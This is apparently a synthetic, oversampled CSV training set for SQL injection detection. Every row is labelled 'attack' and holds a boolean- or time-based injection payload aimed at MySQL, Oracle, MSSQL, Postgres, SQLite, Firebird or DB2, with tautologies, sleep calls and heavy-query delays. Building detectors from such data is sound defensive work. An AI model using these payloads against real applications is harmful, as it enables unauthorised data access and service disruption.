id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
SMOTE_000254,attack,boolean," select * from users where id  =  1 or ""  (  ]"" or 1  =  1 -- 1",nearest_attack_euclidean,R000002,1.1920928955078125e-07
SMOTE_000255,attack,boolean,-4873'   )    )     )   or 3038  =  3038,nearest_attack_euclidean,R000991,0.008838556102234297
SMOTE_000256,attack,boolean,"1'||  (  select 'lxpg' where 7390  =  7390 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",nearest_attack_euclidean,R001072,0.9202665234253317
SMOTE_000257,attack,boolean,"1   )    )    and make_set  (  8554  =  3286,3286  )   and    (    (   7385  =  7385",nearest_attack_euclidean,R000626,0.524698747638172
SMOTE_000258,attack,boolean,1  )   where 5866  =  5866 and 4595  =  4595#,nearest_attack_euclidean,R001309,0.8227769821571892
SMOTE_000259,attack,boolean,"1 where 7522  =  7522 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",nearest_attack_euclidean,R001125,0.1851529193608334
SMOTE_000260,attack,boolean,"1%'   )    )     )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000347,0.13580094232975215
SMOTE_000261,attack,boolean,"1""   )    )     )   and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R001213,0.9003023367463513
SMOTE_000262,attack,boolean,"-5587%'  )   or elt  (  1032  =  1032,3623  )   and   (  '%'  =  '",nearest_attack_euclidean,R000607,0.00794041488934715
SMOTE_000263,attack,boolean,-8777%'   )    )     )   or   (  3934  =  2025  )  *2025 and    (    (     (  '%'  =  ',nearest_attack_euclidean,R000722,0.9401645900339013
SMOTE_000264,attack,boolean,"1%""   )    )    and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   ""%""  =  """,nearest_attack_euclidean,R000407,0.4396850738743821
SMOTE_000265,attack,boolean,"1%'  )   and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R001279,0.9786957319231
SMOTE_000266,attack,boolean,1'   )    )     )   and   (  1685  =  2985  )  *2985 and    (    (     (  'rzwb'  =  'rzwb,nearest_attack_euclidean,R000350,0.018181440612035405
SMOTE_000267,attack,boolean,1'  )   and 9198  =  9198--,nearest_attack_euclidean,R000161,0.009349800325767358
SMOTE_000268,attack,boolean,"1'||  (  select 'rawn' from dual where 4988  =  4988 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null   )    )   ||'",nearest_attack_euclidean,R000122,1.1430430239832814
SMOTE_000269,attack,boolean,"1'+  (  select ouhd where 8905  =  8905 and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7   )    )   +'",nearest_attack_euclidean,R000545,0.16885052061559794
SMOTE_000270,attack,boolean,"1%""   )    )    or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""%""  =  """,nearest_attack_euclidean,R001278,1.0976128408775074
SMOTE_000271,attack,boolean,"1""  )   as lipa where 3450  =  3450 and make_set  (  8403  =  8403,8899  )  --",nearest_attack_euclidean,R001379,0.33142256458786246
SMOTE_000272,attack,boolean,"1  )   or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000946,0.39468609639045527
SMOTE_000273,attack,boolean,Ã½ or 1  =  1 --,nearest_attack_euclidean,R000041,1.0308753690257912
SMOTE_000274,attack,boolean,"1'||  (  select 'scba' where 9079  =  9079 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000961,1.0844869065951703
SMOTE_000275,attack,boolean,"1""   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   ""ycuo"" like ""ycuo",nearest_attack_euclidean,R001014,0.17063592336441957
SMOTE_000276,attack,boolean,"1'+  (  select tnch where 1867  =  1867 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null   )    )   +'",nearest_attack_euclidean,R001432,0.08445552571726042
SMOTE_000277,attack,boolean,"-8327 where 7555  =  7555 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",nearest_attack_euclidean,R000704,0.8046457581660457
SMOTE_000278,attack,boolean,"1"" or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and ""ljkg""  =  ""ljkg",nearest_attack_euclidean,R000850,0.10598084710973589
SMOTE_000279,attack,boolean,-8023' or 6872  =  6872,nearest_attack_euclidean,R001092,0.1090545420717252
SMOTE_000280,attack,boolean,"-8550""  )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  ""kyad""  =  ""kyad",nearest_attack_euclidean,R000878,0.024409036454862806
SMOTE_000281,attack,boolean,"1""  )   and make_set  (  4553  =  8132,8132  )   and   (  ""pfci"" like ""pfci",nearest_attack_euclidean,R001453,0.5338220242512379
SMOTE_000282,attack,boolean,"1' where 1917  =  1917 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000381,0.1287872396707641
SMOTE_000283,attack,boolean,"1' where 4880  =  4880 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",nearest_attack_euclidean,R000871,0.15571099206107836
SMOTE_000284,attack,boolean,"1""   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  ""wile"" like ""wile",nearest_attack_euclidean,R001320,0.9046604192590807
SMOTE_000285,attack,boolean,-2820'   )    )    or 6679  =  8848--,nearest_attack_euclidean,R000928,0.3747691307219357
SMOTE_000286,attack,boolean,1'   )    )     )   and   (  1685  =  2985  )  *2985 and    (    (     (  'rzwb'  =  'rzwb,nearest_attack_euclidean,R000350,0.2721661779044328
SMOTE_000287,attack,boolean,"1' or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and 'aytf' like 'aytf",nearest_attack_euclidean,R000623,1.2360915628762899
SMOTE_000288,attack,boolean,"1  )   as ooex where 1087  =  1087 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000700,0.07223609021212399
SMOTE_000289,attack,boolean,"-8409%'  )   or make_set  (  9354  =  9354,7185  )   and   (  '%'  =  '",nearest_attack_euclidean,R000696,0.8736654627995301
SMOTE_000290,attack,boolean,"1'  )   as kgnd where 1550  =  1550 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000348,0.07123190071349071
SMOTE_000291,attack,boolean,1'  )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     ) ,nearest_attack_euclidean,R001060,1.0676830273491702
SMOTE_000292,attack,boolean,"1'  )   as hvyx where 3194  =  3194 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000794,0.28873788246338794
SMOTE_000293,attack,boolean,"1 where 5382  =  5382 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R001122,1.0697056164467997
SMOTE_000294,attack,boolean," select * from users where id  =  1 or ""]{"" or 1  =  1 -- 1",nearest_attack_euclidean,R000008,0.0
SMOTE_000295,attack,boolean,"1""  )   where 3393  =  3393 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000774,0.038065621365581545
SMOTE_000296,attack,boolean,1  )   as qgsb where 7600  =  7600 and 2006  =  2006,nearest_attack_euclidean,R000179,0.9783000279944595
SMOTE_000297,attack,boolean,-5880'   )    )    or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'rwgl'  =  'rwgl,nearest_attack_euclidean,R001153,0.010244982351125385
SMOTE_000298,attack,boolean,-3044'  )   or 4999  =  3051#,nearest_attack_euclidean,R000403,0.04919736588247183
SMOTE_000299,attack,boolean,"1'  )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  'gmil'  =  'gmil",nearest_attack_euclidean,R000123,0.12462992434183386
SMOTE_000300,attack,boolean,"1%""  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and   (  ""%""  =  """,nearest_attack_euclidean,R001441,1.1911874099171775
SMOTE_000301,attack,boolean,"1""   )    )    or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""dbxi"" like ""dbxi",nearest_attack_euclidean,R001270,0.3012232659329925
SMOTE_000302,attack,boolean,"1%""   )    )     )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000223,0.008067450262583526
SMOTE_000303,attack,boolean,"1'   )    )     )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'nlky' like 'nlky",nearest_attack_euclidean,R000690,0.23479060186128356
SMOTE_000304,attack,boolean,-7207' or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and 'obxw'  =  'obxw,nearest_attack_euclidean,R000657,1.3193051204081854
SMOTE_000305,attack,boolean,"1""   )    )     )   rlike   (  select   (  case when   (  6915  =  4531  )   then 1 else 0x28 end   )    )    and    (    (     (  ""jzzu""  =  ""jzzu",nearest_attack_euclidean,R000862,0.6951185341943198
SMOTE_000306,attack,boolean,"1""   )    )     )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and    (    (     (  ""znzb"" like ""znzb",nearest_attack_euclidean,R001180,1.6953230087308768
SMOTE_000307,attack,boolean,"1'   )    )     )    (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (     (  'weof'  =  'weof",nearest_attack_euclidean,R001362,0.19668945840968685
SMOTE_000308,attack,boolean,"-5231%"" or 4945  =  8402#",nearest_attack_euclidean,R001490,1.5122846299921198
SMOTE_000309,attack,boolean,-7548 or 2850  =  9666,nearest_attack_euclidean,R000625,0.0870953003256999
SMOTE_000310,attack,boolean,-7726 or 3038  =  3038,nearest_attack_euclidean,R001257,0.03588352345853032
SMOTE_000311,attack,boolean,1'   )    )     )   and 5934  =  2309,nearest_attack_euclidean,R001234,0.273735529874662
SMOTE_000312,attack,boolean,"1  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  9112  =  9112",nearest_attack_euclidean,R000441,0.36458466177543725
SMOTE_000313,attack,boolean,1'   )    )     )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  'yxpi'  =  'yxpi,nearest_attack_euclidean,R001552,0.3102228017638937
SMOTE_000314,attack,boolean,"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  8997  =  8997",nearest_attack_euclidean,R000599,0.3324167166641045
SMOTE_000315,attack,boolean,"1' and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and 'qyyg'  =  'qyyg",nearest_attack_euclidean,R000795,0.31652762196038486
SMOTE_000316,attack,boolean," select * from users where id  =  1 or "".,"" or 1  =  1 -- 1",nearest_attack_euclidean,R000021,0.0
SMOTE_000317,attack,boolean,1   )    )    and 4595  =  4595#,nearest_attack_euclidean,R001081,0.5059596786281698
SMOTE_000318,attack,boolean,"-9145%'   )    )     )   or make_set  (  9017  =  9368,9368  )   and    (    (     (  '%'  =  '",nearest_attack_euclidean,R000398,0.008291165732468882
SMOTE_000319,attack,boolean,"-5174'   )    )     )   or make_set  (  9515  =  7938,7938  )   and    (    (     (  'ygee'  =  'ygee",nearest_attack_euclidean,R000556,0.13203975173698096
SMOTE_000320,attack,boolean,1'   )    )    as stnn where 6160  =  6160 and 8881  =  7347--,nearest_attack_euclidean,R000872,0.46878323595992155
SMOTE_000321,attack,boolean,"1%'   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000258,0.4434748393361731
SMOTE_000322,attack,boolean,"-8025""  )   or   (  1436  =  4186  )  *4186 and   (  ""sqwv"" like ""sqwv",nearest_attack_euclidean,R000245,0.29498942922435856
SMOTE_000323,attack,boolean,1'  )   as llug where 2244  =  2244 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,nearest_attack_euclidean,R000148,0.05711758538436867
SMOTE_000324,attack,boolean,-8876'   )    )    or 3038  =  3038,nearest_attack_euclidean,R001481,0.20095005533974644
SMOTE_000325,attack,boolean,"1%""   )    )     )   and 1594  =  8757",nearest_attack_euclidean,R001333,0.07598652097924083
SMOTE_000326,attack,boolean,"-7743"" or 9323  =  9323#",nearest_attack_euclidean,R001497,0.8008033336808444
SMOTE_000327,attack,boolean,"1""   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  ""wile"" like ""wile",nearest_attack_euclidean,R001320,0.29400298740356834
SMOTE_000328,attack,boolean,"1%' or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000390,0.34831287217828394
SMOTE_000329,attack,boolean,"-4736'   )    )    or elt  (  5835  =  5509,5509  )   and    (    (   'iawg'  =  'iawg",nearest_attack_euclidean,R001177,0.04110175009657938
SMOTE_000330,attack,boolean,"1   )    )     )   and make_set  (  8882  =  1593,1593  )   and    (    (     (  7989  =  7989",nearest_attack_euclidean,R001249,0.24332430004081548
SMOTE_000331,attack,boolean,"1'   )    )    as qzyp where 5081  =  5081 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",nearest_attack_euclidean,R001036,0.015649307909441714
SMOTE_000332,attack,boolean,"1  )   as iovi where 3910  =  3910 or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",nearest_attack_euclidean,R001435,0.20448140138977544
SMOTE_000333,attack,boolean,"1"" and 9198  =  9198--",nearest_attack_euclidean,R000387,1.7129969542527352
SMOTE_000334,attack,boolean,""" or 1  =  1--",nearest_attack_euclidean,R000114,1.0914346289381367
SMOTE_000335,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (     (  4537  =  4537",nearest_attack_euclidean,R000786,0.39501772627832676
SMOTE_000336,attack,boolean,"1%""  )   and 4595  =  4595#",nearest_attack_euclidean,R001382,0.5102921296616348
SMOTE_000337,attack,boolean,"1%""   )    )     )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R001088,0.08993959831284323
SMOTE_000338,attack,boolean,"1%""   )    )    or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000345,0.25846689702237263
SMOTE_000339,attack,boolean,"1"" and 6637  =  2321",nearest_attack_euclidean,R000945,0.6055632484951983
SMOTE_000340,attack,boolean,-8004%'  )   or   (  2301  =  7504  )  *7504 and   (  '%'  =  ',nearest_attack_euclidean,R000771,0.2696659560273898
SMOTE_000341,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and ""%""  =  """,nearest_attack_euclidean,R000275,0.5269988700402919
SMOTE_000342,attack,boolean,"1""  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  ""dwpa""  =  ""dwpa",nearest_attack_euclidean,R001411,0.7020300458421969
SMOTE_000343,attack,boolean,1'||  (  select 'boxx' where 2038  =  2038 and 9198  =  9198--,nearest_attack_euclidean,R000571,1.5213038468439208
SMOTE_000344,attack,boolean,-2717'   )    )     )   or 8571  =  8571--,nearest_attack_euclidean,R000694,0.10477808800065368
SMOTE_000345,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000592,1.5003571247212402
SMOTE_000346,attack,boolean,"1"" and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R001304,0.09403730937984733
SMOTE_000347,attack,boolean,"1   )    )    and elt  (  4249  =  4249,7259  )   and    (    (   5683  =  5683",nearest_attack_euclidean,R001319,0.1754988647695034
SMOTE_000348,attack,boolean,"1'||  (  select 'ggfx' where 4932  =  4932 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   ||'",nearest_attack_euclidean,R000349,0.80422518430528
SMOTE_000349,attack,boolean,"-1907""   )    )    or 2782  =  3591",nearest_attack_euclidean,R000620,0.0763547537635096
SMOTE_000350,attack,boolean,1'   )    )    and   (  3020  =  3020  )  *6703 and    (    (   'vvkd' like 'vvkd,nearest_attack_euclidean,R001530,0.00139681985814298
SMOTE_000351,attack,boolean,"-6747"" or 9323  =  9323#",nearest_attack_euclidean,R000204,0.11599151603155247
SMOTE_000352,attack,boolean,"1""   )    )    and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   ""hmun""  =  ""hmun",nearest_attack_euclidean,R000977,0.11097764406373821
SMOTE_000353,attack,boolean," select * from users where id  =  1 or ""?;"" or 1  =  1 -- 1",nearest_attack_euclidean,R000066,3.371747880871523e-07
SMOTE_000354,attack,boolean,"1'   )    )     (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )     )   and    (    (   'dpdz' like 'dpdz",nearest_attack_euclidean,R000164,0.630635733249084
SMOTE_000355,attack,boolean,1' and 5835  =  6157 and 'bjee' like 'bjee,nearest_attack_euclidean,R001455,1.0183035561244267
SMOTE_000356,attack,boolean,"-1197""   )    )    as dfsy where 8857  =  8857 or 3038  =  3038",nearest_attack_euclidean,R001158,0.3418868669605373
SMOTE_000357,attack,boolean," select * from users where id  =  1 or ""]{"" or 1  =  1 -- 1",nearest_attack_euclidean,R000008,0.0
SMOTE_000358,attack,boolean,-1485'  )   or   (  2056  =  4008  )  *4008 and   (  'vphj'  =  'vphj,nearest_attack_euclidean,R000913,0.442401556970371
SMOTE_000359,attack,boolean,""" or ""x""  =  ""x",nearest_attack_euclidean,R000071,1.3321186193155947
SMOTE_000360,attack,boolean,"-3505""  )   where 2340  =  2340 or 9323  =  9323#",nearest_attack_euclidean,R001116,0.6065570208341238
SMOTE_000361,attack,boolean,select * from users where id  =  1 + $+%\ or 1  =  1 -- 1,nearest_attack_euclidean,R000063,0.6320385645095108
SMOTE_000362,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and   (  'njnr'  =  'njnr",nearest_attack_euclidean,R000131,0.32078313321078483
SMOTE_000363,attack,boolean,"-2414%""  )   or elt  (  1032  =  1032,3623  )   and   (  ""%""  =  """,nearest_attack_euclidean,R001099,0.9131398483649964
SMOTE_000364,attack,boolean,-7773' or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  ) ,nearest_attack_euclidean,R001540,0.36057244898853685
SMOTE_000365,attack,boolean,-7378' or 6872  =  6872 and 'bnmn' like 'bnmn,nearest_attack_euclidean,R001163,0.4665566917280256
SMOTE_000366,attack,boolean,"1'||  (  select 'dbxr' where 4014  =  4014 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000535,0.45153660729309164
SMOTE_000367,attack,boolean,"-8200' where 3422  =  3422 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",nearest_attack_euclidean,R001256,0.07311404410476773
SMOTE_000368,attack,boolean,"1'   )    )     )   and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  'rfln'  =  'rfln",nearest_attack_euclidean,R000270,0.29580173175995667
SMOTE_000369,attack,boolean,1' where 9583  =  9583 and 5319  =  7670#,nearest_attack_euclidean,R000740,0.6605102018272854
SMOTE_000370,attack,boolean,"1""  )   and 8677  =  9054#",nearest_attack_euclidean,R001104,0.4471466513303366
SMOTE_000371,attack,boolean,"1  )   as ooex where 1087  =  1087 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000700,0.04920501598929205
SMOTE_000372,attack,boolean,"1'||  (  select 'osty' from dual where 6433  =  6433 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5   )    )   ||'",nearest_attack_euclidean,R000838,0.2246802672512709
SMOTE_000373,attack,boolean,1'||  (  select 'vxfx' where 7038  =  7038 and 9306  =  4187  )  ||',nearest_attack_euclidean,R000302,0.8826066750193903
SMOTE_000374,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000529,0.06071590536117737
SMOTE_000375,attack,boolean,or 'a'  =  'a,nearest_attack_euclidean,R000044,0.023290857900576608
SMOTE_000376,attack,boolean,1%'   )    )    and 2006  =  2006,nearest_attack_euclidean,R001056,0.871471625088448
SMOTE_000377,attack,boolean, or 3  =  3 --,nearest_attack_euclidean,R000019,0.9218421361754711
SMOTE_000378,attack,boolean,"-3856""  )   as iyzl where 7394  =  7394 or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",nearest_attack_euclidean,R000468,0.016281287058508
